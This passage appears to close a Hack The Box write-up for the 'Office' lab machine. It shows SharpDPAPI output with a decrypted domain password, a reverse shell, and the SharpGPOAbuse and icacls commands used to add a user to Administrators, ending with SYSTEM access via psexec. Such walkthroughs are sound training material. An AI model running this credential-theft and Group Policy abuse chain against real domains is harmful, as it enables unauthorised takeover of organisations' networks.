 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.12.0                               


[*] Action: User DPAPI Credential Triage

[*] Will ask a domain controller to decrypt masterkeys for us

[*] Found MasterKey : C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\10811601-0fa9-43c2-97e5-9bef8471fc7d
[*] Found MasterKey : C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb
[*] Found MasterKey : C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\fb2eb8a9-12f7-4f07-83ee-d2cd6aae71c0

[*] Preferred master keys:

C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107:fb2eb8a9-12f7-4f07-83ee-d2cd6aae71c0

[*] User master key cache:

{10811601-0fa9-43c2-97e5-9bef8471fc7d}:FBAB11CACDD8407E8DB9604F0F8C92178BEE6FD3
{191d3f9d-7959-4b4d-a520-a444853c47eb}:85285EB368BEFB1670633B05CE58CA4D75C73C77
{fb2eb8a9-12f7-4f07-83ee-d2cd6aae71c0}:33DB2B821336CD6E93872AD397CB6960F1E9EEBA


[*] Triaging Credentials for current user


Folder       : C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\

  CredFile           : 18A1927A997A794B65E9849883AC3F3E

    guidMasterKey    : {191d3f9d-7959-4b4d-a520-a444853c47eb}
    size             : 358
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    LastWritten      : 5/9/2023 2:08:54 PM
    TargetName       : LegacyGeneric:target=MyTarget
    TargetAlias      : 
    Comment          : 
    UserName         : MyUser
    Credential       : 

  CredFile           : 84F1CAEEBF466550F4967858F9353FB4

    guidMasterKey    : {191d3f9d-7959-4b4d-a520-a444853c47eb}
    size             : 398
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    LastWritten      : 5/9/2023 4:03:21 PM
    TargetName       : Domain:interactive=OFFICE\HHogan
    TargetAlias      : 
    Comment          : 
    UserName         : OFFICE\HHogan
    Credential       : H4ppyFtW183#

  CredFile           : E76CCA3670CD9BB98DF79E0A8D176F1E

    guidMasterKey    : {10811601-0fa9-43c2-97e5-9bef8471fc7d}
    size             : 374
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Enterprise Credential Data

    LastWritten      : 1/18/2024 11:53:30 AM
    TargetName       : Domain:interactive=office\hhogan
    TargetAlias      : 
    Comment          : 
    UserName         : office\hhogan
    Credential       : 



SharpDPAPI completed in 00:00:00.2319211
```


![](/assets/images/HTB-Writeup-Office/Pasted image 20240619210210.png)

- Great! The pentester obtained a new credential pair (`HHogan`:`H4ppyFtW183#`). Afterwards, he achieved a reverse shell as `HHogan` using the same `revshmet.exe` payload, which was executed by `RunasCs.exe`.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619213111.png)

- While reviewing `BloodHound` for information on the user `HHogan`, the pentester found that the user had `GenericWrite` permissions on `Default Domain Policy` and `Default Domain Controllers Policy`.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240620010610.png)

- `BloodHound`  indicates the actions that could be performed to exploit the `GenericWrite` grant on a `Group Policy Object`.

![](/assets/images/HTB-Writeup-Office/Pasted image 20240620010523.png)

- After searching for tools that allow this rights to be abused, he found `SharpGPOAbuse.exe`. `SharpGPOAbuse.exe` is a .NET tool that exploits user edit rights on a `Group Policy Object` (GPO) to compromise managed objects. Therefore, the pentester uploaded `SharpGPOAbuse.exe` to the target host in order to exploit it.

```bash
upload SharpGPOAbuse.exe c:\\windows\\tasks
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619211959.png)

>Tip: Make sure to upload `SharpGPOAbuse.exe` as the user `HHogan`, otherwise you will need to grant `Full` privileges to the `Everyone` group for this executable.
>
```bash
icacls C:\windows\tasks\SharpGPOAbuse.exe  /grant Everyone:(F)
```
{: .prompt-tip }


- Then execute `SharpGPOAbuse.exe` with the payload that will add the user `HHogan` to the `Administrators` group. Nice! He executed it and successfully added the user `HHogan`.

```shell
c:\Windows\Tasks\SharpGPOAbuse.exe --AddLocalDomain --UserAccount HHogan --GPOName "Default Domain Policy"
```

![](/assets/images/HTB-Writeup-Office/Pasted image 20240619212309.png)

- Finally, with `psexec.py` from the Impacket Suite, it's possible to obtain a shell as `NT Authority\System` and read `root.txt`.
![](/assets/images/HTB-Writeup-Office/Pasted image 20240619213751.png)

>I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/users/1504363) and give me a respect 😁. Happy Hacking!!👾
{: .prompt-tip }